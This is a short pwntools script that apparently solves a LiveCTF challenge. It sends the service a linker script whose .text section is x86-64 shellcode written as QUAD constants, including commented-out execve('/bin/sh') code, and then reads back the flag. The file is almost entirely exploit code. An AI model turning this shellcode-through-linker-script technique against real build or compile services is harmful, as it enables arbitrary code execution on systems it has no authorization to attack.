from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

s = remote(HOST, int(PORT))
sla = s.sendlineafter
sa = s.sendafter
src = '''ENTRY(_entry)
SECTIONS
{
  . = 0x10000; /* Start address */
  .text : AT( ADDR(.text) )
  {
    /*QUAD(0x6e69622fb848686a)
    QUAD(0xe7894850732f2f2f)
    QUAD(0x2434810101697268)
    QUAD(0x6a56f63101010101)
    QUAD(0x894856e601485e08)
    QUAD(0x050f583b6ad231e6)*/
    *(.text)
  }
  .data : { *(.data) }
  .bss : { *(.bss) }
}
'''

src = '''OUTPUT_FORMAT("elf64-x86-64", "elf64-x86-64", "elf64-x86-64")
OUTPUT_ARCH(i386:x86-64)
ENTRY(_start)
SECTIONS
{
  . = 0x400000 + SIZEOF_HEADERS;
  .text : {
    _start = .;
    QUAD(0x10101010101b848)
    QUAD(0x68632eb848500101)
    QUAD(0x431480169722e6f)
    QUAD(0x1736468e7894824)
    QUAD(0x101010124348101)
    QUAD(0x696d6275732fb848)
    QUAD(0x696c2fb848507474)
    QUAD(0xb848506674636576)
    QUAD(0x101010101010101)
    QUAD(0x692e01622cb84850)
    QUAD(0x4824043148646c6e)
    QUAD(0x1010101010101b8)
    QUAD(0x6f68632eb8485001)
    QUAD(0x240431480169722e)
    QUAD(0x1485e136a56f631)
    QUAD(0xe601485e186a56e6)
    QUAD(0x56e601485e186a56)
    QUAD(0x583b6ad231e68948)
    QUAD(0x909090909090050f)
  }
}
'''

s.sendline(src.encode())
flag = s.recvline_contains(b'LiveCTF{')
s.close()
log.info("Flag: %s", flag)



